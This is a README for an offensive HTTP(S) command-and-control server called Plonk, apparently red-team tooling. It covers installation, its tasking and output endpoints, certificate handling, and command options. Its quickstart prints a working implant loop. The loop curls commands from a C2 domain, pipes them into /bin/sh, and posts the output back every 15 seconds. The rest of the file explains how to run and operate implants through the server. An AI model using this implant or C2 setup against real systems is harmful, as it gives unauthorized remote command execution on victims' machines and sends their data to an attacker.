Plonk HTTP C2 and Static File Server
====================================
Plonk is a little HTTP(s) server program you can just plonk down and use for
quick'n'dirty C2ish infrastructure.  It serves static file and can serve
rudimentary tasking and take output.

Quickstart
----------
1. Start the C2 server
```bash
go install github.com/magisterquis/plonk@latest
plonk -h
plonk -letsencrypt c2domain.example.com
```
2. Get an implant going on target
```bash
while :; do
        curl -s https://c2domain.example.com/t/kittens |
        /bin/sh |
        curl --data-binary @- -s https://c2domain.example.com/o/kittens
        
        sleep 15
done
```
3. Tasking and output
```bash
plonk -interact kittens
ps awwwfux
```

Features
--------
- HTTP
- HTTPS with (in order of preference)
  - Automatic certificate provisioning with Let's Encrypt
  - Easy usage of custom certificates
  - Self-signed certificate generation
- Static file server
- Tasking over HTTP(s)
- Task output logging over HTTP(s)
- Simple interactive interface

Installation
------------
With a [typical Go installation](https://golang.org/...):
```sh
go install github.com/magisterquis/plonk@latest
```

Alternatively, Plonk for several architectures may be built with
[`build.sh`](./build.sh).

Static And Default Files
------------------------
Static files placed in `plonk.d/files` will be served under the path `/f`, e.g.
a request for `https://example.com/f/tools/implant` will return
`plonk.d/files/tools/implant`.

Requests for unexpected paths (i.e. not in the table below) will be served
a static file, `plonk.d/index.html`.

Implants
--------
Plonk does not currently have any pre-built implants.  The Implant HTTP API
(such as it is) is a follows:

Default Endpoint | [Environment Variable](#Environment-Variables) | Description
-----------------|------------------------------------------------|-
`/f/<path>`      | `PLONK_FILESPREFIX`/`PLONK_STATICFILESDIR`     | Download a static file
`/t/<ImplantID>` | `PLONK_TASKPREFIX`                             | Retrieve tasking
`/o/<ImplantID>` | `PLONK_OUTPUTPREFIX`                           | Return output

The `/<ImplantID>` above may be omitted for an IDless implant.  To interact
with an IDless implant, `-task -` and `-interact -` may be used.  If more than
one implant doesn't provide an ImplantID, tasking will go to whichever asks
first.

There are a few low-effort implants in
[`implant_ideas.md`](./implant_ideas.md).

Signals
-------
Plonk listens for two Signals, SIGHUP and SIGUSR1.

SIGHUP causes the following:
- Tasking file is closed and reopened.  This is useful for after editing it
  with vim.
- Certificates cached in memory are forgotten.  This is useful for manual
  certificate updating with no downtime.
- Seen implants are forgotten.  This is useful for logging the next callback
  of an implant which has already called back without using `-verbose`.

SIGUSR1 causes the following:
- Generated self-signed certificates are written to disk.  This is useful for
  restarting Plonk while an implant which checks a self-signed cert's
  fingerprint is still running.

Usage
-----
```
Usage: plonk [options]

  HTTP(s)-based static file and rudimentary C2 server.

  Upon starting, Plonk will make a directory (-work-dir, currently plonk.d),
  chdir into it, and make other supporting files and directories.  The names of
  these and several other things can be controlled with environment variables,
  listable with -print-env.

  TLS certificates may, in order of preference, be automatically provisioned
  using Let's Encrypt (-letsencrypt*), stored as pairs of
  plonk.d/certs/domain.tld.{crt,key}, or failing that, generated as
  self-signed certificates.

  Do not use -letsencrypt unless you accept Let's Encrypt's Terms of Service.

  Files and directories under plonk.d/files/ will served when Plonk gets a
  request for a path under /f/.

  C2 tasking is retrieved by a request to /t/<ImplantID>.  The /<ImplantID>
  may be empty; Plonk treats this as an IDless implant.  Tasking is stored in a
  single JSON file (currently plonk.d/tasking.json), which may be updated by
  hand or with -task or -implant, as below.  Plonk doesn't do anything to
  process tasking; whatever it gets it sends directly to the implant.

  Output from implants is sent in an HTTP request body to /o/<ImplantID>, or
  just /o for an IDless implant.

  HTTP verbs for all requests are ignored.  HTTP requests for paths other than
  the above are served a single static file, by default plonk.d/index.html.

  All of the above is logged in plonk.d/log.

  When Plonk gets a SIGHUP, it reopens the taskfile and forgets the self-signed
  certificates it's generated as well as its list of seen implants.  When Plonk
  gets a SIGUSR1, it writes the self-signed certificates it's generated to the
  local certificate directory.

  The first time Plonk is run, it is helpful to use -verbose.

Usage: plonk -task implantID|- [task...]

  Adds a task for the given implant, or - for the IDless implant.  This
  invocation af Plonk must be run with the same idea of the tasking file
  (currently plonk.d/tasking.json) as the server process.

Usage: plonk -implant implantID|-

  Interactive(ish) operation.  Given an implant ID (or - for the IDlessimplant)
  it queues as tasking non-blank, non #-prefixed lines it reads on standard
  input and displays relevant logfile lines on standard output.  Probably best
  used with rlwrap.  Like -task, this invocation of Plonk must be run with the
  same idea of the tasking file (currently plonk.d/tasking.json) as well as the
  logfile (currently plonk.d/log).

Options:
  -http address
    	HTTP address
  -https address
    	HTTPS address (default "0.0.0.0:443")
  -interact string
    	Interact with the given implant ID, or - for an IDless implant
  -letsencrypt domain
    	Use Let's Encrypt to provision certificates for the given domain (may be repeated)
  -letsencrypt-email address
    	Optional email address to use for Let's Encrypt
  -letsencrypt-staging
    	Use Let's Encrypt's staging server
  -print-env
    	Print the configuration environment variables
  -task ID
    	Queue a task for the given implant ID or - for an IDless implant
  -verbose
    	Log ALL the things
  -whitelist-self-signed domain
    	Allow self-signed cert generation for the given (possibly wildcarded) domain or IP address (may be repeated, default *)
  -work-dir directory
    	Working directory (default "plonk.d")
```

Environment Variables
---------------------
Plonk reads configuration from the following environment variables at runtime:

Variable|Default|Description
-|-
`PLONK_DEFAULTFILE`    |`index.html`   | File served for otherwise-unhandled requests
`PLONK_FILESPREFIX`    |`f`            | URL path prefix for requesting static files
`PLONK_HTTPTIMEOUT`    |`1m`           | HTTP request timeout
`PLONK_LECERTDIR`      |`lecerts`      | Let's Encrypt certificate cache directory
`PLONK_LOCALCERTDIR`   |`certs`        | Locally-configured (non-Let's Encrypt) certificate directory
`PLONK_LOGFILE`        |`log`          | Logfile
`PLONK_OUTPUTMAX`      |`10485760`     | Maximum output read in one request from an Implant
`PLONK_OUTPUTPREFIX`   |`o`            | URL path prefix used by implants to request to send output
`PLONK_STATICFILESDIR` |`files`        | Static files directory
`PLONK_TASKFILE`       |`tasking.json` | Queued tasking file
`PLONK_TASKPREFIX`     |`t`            | URL path prefix used by implants to request tasking

The list may also be printed with `-print-env`.

Filenames and directories above are taken as subdirectories of Plonk's working
directory, by default `plonk.d` unless they're absolute paths.
